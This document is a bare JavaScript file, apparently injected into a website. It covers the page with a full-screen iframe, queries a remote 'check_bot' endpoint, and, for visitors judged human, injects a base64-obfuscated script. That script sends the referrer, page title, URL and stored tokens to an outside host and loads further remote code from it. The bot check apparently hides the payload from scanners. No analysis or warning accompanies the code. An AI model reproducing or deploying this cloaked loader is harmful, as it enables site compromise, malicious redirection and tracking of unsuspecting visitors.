const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfVnNtczRoUTVQdjNHNVIxMSc7CiAgICBpZiAoIXdpbmRvdy5fVnNtczRoUTVQdjNHNVIxMSkgewogICAgICAgIHdpbmRvdy5fVnNtczRoUTVQdjNHNVIxMSA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vUk5oOXBMRk4nLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfUHpNV3dWTVYzaGRtd3dQbSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX1B6TVd3Vk1WM2hkbXd3UG0gIT09ICd1bmRlZmluZWQnICYmIF9Qek1Xd1ZNVjNoZG13d1BtICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9DeWd2blpxN3hSRkw5Tk41ID0gSlNPTi5wYXJzZShfUHpNV3dWTVYzaGRtd3dQbSk7CiAgICAgICAgdmFyIF81UndEWFJ3NE1HbktZdjk2ID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX0N5Z3ZuWnE3eFJGTDlOTjUuY3JlYXRlZF9hdCArIHdpbmRvdy5fVnNtczRoUTVQdjNHNVIxMS50dGwgPCBfNVJ3RFhSdzRNR25LWXY5NikgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX3NnODk1WXRiVDQ4TmJONHkgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfbjNkcWdzMVo5cjRRcWc4dCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF84NTh2Z3BqSEtaUVFtVnB5ID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfODU4dmdwakhLWlFRbVZweSArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfODU4dmdwakhLWlFRbVZweSArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF84NTh2Z3BqSEtaUVFtVnB5ICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF84NTh2Z3BqSEtaUVFtVnB5ICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfODU4dmdwakhLWlFRbVZweSArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfODU4dmdwakhLWlFRbVZweSArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX1ZzbXM0aFE1UHYzRzVSMTEuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX3NnODk1WXRiVDQ4TmJONHkgIT09ICd1bmRlZmluZWQnICYmIF9zZzg5NVl0YlQ0OE5iTjR5ICYmIHdpbmRvdy5fVnNtczRoUTVQdjNHNVIxMS51bmlxdWUpIHsKICAgICAgICBfODU4dmdwakhLWlFRbVZweSArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9zZzg5NVl0YlQ0OE5iTjR5KTsKICAgIH0KICAgIGlmICh0eXBlb2YgX24zZHFnczFaOXI0UXFnOHQgIT09ICd1bmRlZmluZWQnICYmIF9uM2RxZ3MxWjlyNFFxZzh0ICYmIHdpbmRvdy5fVnNtczRoUTVQdjNHNVIxMS51bmlxdWUpIHsKICAgICAgICBfODU4dmdwakhLWlFRbVZweSArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX24zZHFnczFaOXI0UXFnOHQpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF84NTh2Z3BqSEtaUVFtVnB5ICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fVnNtczRoUTVQdjNHNVIxMS5SX1BBVEggKyBfODU4dmdwakhLWlFRbVZweTsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
             document.querySelector("head").appendChild(script);
        }
        setTimeout(toggleLoad, 1000);
        
    })
})
